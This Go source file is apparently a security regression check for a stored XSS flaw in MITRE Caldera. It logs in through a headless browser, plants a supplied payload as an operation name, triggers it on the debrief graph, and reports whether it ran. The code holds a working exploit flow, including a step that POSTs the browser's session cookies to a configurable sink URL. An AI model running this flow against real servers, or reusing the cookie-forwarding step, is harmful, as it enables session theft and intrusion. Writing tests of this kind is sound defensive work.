/*
Copyright © 2022-present, Meta Platforms, Inc. and affiliates

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

package cmd

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"net/http"
	"os"

	"github.com/chromedp/cdproto/emulation"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"
	"github.com/fatih/color"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"github.com/spf13/viper"
)

var (
	// StoredXSSDosCmd runs the XSS vulnerability found after DEF CON 30.
	StoredXSSDosCmd = &cobra.Command{
		Use:   "StoredXSSDos",
		Short: "Stored XSS found in addition to the previously reported one",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println(color.YellowString(
				"Introducing stored XSS vulnerability #2, please wait..."))

			caldera.URL = viper.GetString("login_url")
			caldera.RepoPath = viper.GetString("repo_path")
			caldera.Creds, err = GetRedCreds(caldera.RepoPath)
			if err != nil {
				log.WithError(err).Fatalf(
					"failed to get Caldera credentials: %v", err)
			}

			caldera.Driver.Headless = viper.GetBool("headless")
			driver, cancels, err := setupChrome(caldera)
			if err != nil {
				log.WithError(err).Fatal("failed to setup Chrome")
			}

			defer cancelAll(cancels)

			caldera.Driver = driver

			caldera, err = Login(caldera)
			if err != nil {
				log.WithError(err).Fatal("failed to login to caldera")
			}

			caldera.Payload = viper.GetString("payload")

			if err = storedXSSDosVuln(caldera.Payload); err != nil {
				log.WithError(err).WithFields(log.Fields{
					"Payload": caldera.Payload,
				}).Error(color.RedString(err.Error()))
			}
		},
	}
	storedXSSDosSuccess bool
	introPayload        bool
)

func init() {
	rootCmd.AddCommand(StoredXSSDosCmd)
	storedXSSDosSuccess = false
	introPayload = false
}

// Payload is used to represent the POST
// body associated with the source for the attack.
type Payload struct {
	Name               string `json:"name"`
	AutoClose          bool   `json:"auto_close"`
	State              string `json:"state"`
	Autonomous         int    `json:"autonomous"`
	UseLearningParsers bool   `json:"use_learning_parsers"`
	Obfuscator         string `json:"obfuscator"`
	Jitter             string `json:"jitter"`
	Visibility         string `json:"visibility"`
}

func storedXSSDosVuln(payload string) error {
	var buf []byte
	var res *runtime.RemoteObject

	data := Payload{
		Name:               payload,
		AutoClose:          false,
		State:              "running",
		Autonomous:         1,
		UseLearningParsers: true,
		Obfuscator:         "plain-text",
		Jitter:             "2/8",
		Visibility:         "51",
	}
	sinkURL := viper.GetString("sink_url")

	if err := chromedp.Run(caldera.Driver.Context,
		chromedp.ActionFunc(func(ctx context.Context) error {
			cookies, err := network.GetCookies().Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to retrieve cookies")
				return err
			}
			for _, cookie := range cookies {
				payloadBytes, err := json.Marshal(data)
				if err != nil {
					log.WithError(err).Error("failed to marshal payload")
					return err
				}
				body := bytes.NewReader(payloadBytes)

				req, err := http.NewRequest("POST", sinkURL, body)
				if err != nil {
					log.WithError(err).Error("failed to create request")
					return err
				}
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Cookie", fmt.Sprintf("%s=%s", cookie.Name, cookie.Value))
				req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36")

				resp, err := http.DefaultClient.Do(req)
				if err != nil {
					log.WithError(err).Error("failed to submit request")
					return err
				}
				defer resp.Body.Close()

			}

			return nil

		})); err != nil {
		log.WithError(err).Error("failed to retrieve cookie")
		return err
	}

	// XPath and selectors for chromeDP
	opLinkXPath := "/html/body/main/div[1]/aside/ul[1]/li[4]/a"
	createOPXPath := "/html/body/main/div[2]/div[2]/div[1]/div/div/form/div/div[2]/button"
	opNameSelector := "#op-name"
	startButtonXPath := "/html/body/main/div[2]/div[2]/div[1]/div/div/div[3]/div[2]/footer/nav/div[2]/div/button"
	debriefLinkXPath := "/html/body/main/div[1]/aside/ul[2]/li[4]/a"
	firstOperationXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[1]/form/div/div/div/select/option[1]"
	opGraphDropdownSelectXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[2]/div[3]/div[2]/div/select"
	tacticSelector := "#debrief-graph > div.is-flex.graph-controls.m-2 > div > select"
	triggerVulnJS := "nodes = document.querySelectorAll('[id^=node]'); nodes.forEach((x, i) => x.dispatchEvent(new MouseEvent('mouseover', {'bubbles': true})));"

	imagePath := viper.GetString("image_path")

	// listen network event
	listenForNetworkEvent(caldera.Driver.Context)

	// handle payload that use alerts, prompts, etc.
	chromedp.ListenTarget(caldera.Driver.Context, func(ev interface{}) {
		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
			go func() {
				err := chromedp.Run(caldera.Driver.Context,
					page.HandleJavaScriptDialog(true))

				// Account for initial payload introduction
				if !introPayload {
					introPayload = true
				} else {
					// If we have gotten here, the exploit succeeded.
					storedXSSDosSuccess = true
				}

				if err != nil {
					log.Fatal(err)
				}
			}()
		}
	})
	if err := chromedp.Run(caldera.Driver.Context,
		network.Enable(),
		// Click the operations link
		chromedp.Click(opLinkXPath),
		chromedp.Sleep(Wait(2000)),
		// Click Create Operation button
		chromedp.Click(createOPXPath),
		// Create operation with the provided payload
		chromedp.SendKeys(opNameSelector, payload),
		// Click the Start button
		chromedp.Click(startButtonXPath),
		chromedp.Sleep(Wait(2000)),
		// Click the debrief link
		chromedp.Click(debriefLinkXPath),
		chromedp.Sleep(Wait(2000)),
		// Click the operation with the payload that we introduced previously
		chromedp.Click(firstOperationXPath),
		chromedp.Sleep(Wait(2000)),
		// Click the debrief graph dropdown menu
		chromedp.Click(opGraphDropdownSelectXPath),
		chromedp.Sleep(Wait(2000)),
		// Select Tactic from the operation graph dropdown menu
		chromedp.SendKeys(tacticSelector, "Tactic"),
		chromedp.Sleep(Wait(2000)),
		// Trigger the vulnerability
		chromedp.Evaluate(triggerVulnJS, &res),
		chromedp.Sleep(Wait(2000)),
		chromedp.ActionFunc(func(ctx context.Context) error {

			_, _, contentSize, _, _, _, err := page.GetLayoutMetrics().Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to get layout metrics")
				return err
			}

			width, height := int64(math.Ceil(contentSize.Width)),
				int64(math.Ceil(contentSize.Height))

			// force viewport emulation
			err = emulation.SetDeviceMetricsOverride(width, height, 1, false).
				WithScreenOrientation(&emulation.ScreenOrientation{
					Type:  emulation.OrientationTypePortraitPrimary,
					Angle: 0,
				}).Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to override device metrics")
				return err
			}

			// capture screenshot
			buf, err = page.CaptureScreenshot().
				WithQuality(100).
				WithClip(&page.Viewport{
					X:      contentSize.X,
					Y:      contentSize.Y,
					Width:  contentSize.Width,
					Height: contentSize.Height,
					Scale:  2,
				}).Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to take screenshot")
				return err
			}
			return nil
		})); err != nil {
		log.WithError(err).WithFields(log.Fields{
			"Payload": payload,
		}).Error("unexpected error while introducing the exploit")
		return err
	}

	if err := os.WriteFile(imagePath+"2.png", buf, 0644); err != nil {
		log.WithError(err).Error("failed to write screenshot to disk")
	}

	if storedXSSDosSuccess {
		errMsg := "failure: Stored XSS Dos ran successfully"
		return errors.New(errMsg)
	}

	log.WithFields(log.Fields{
		"Payload": payload,
	}).Info(color.GreenString("Success: Stored XSS Dos failed to run"))

	return nil
}
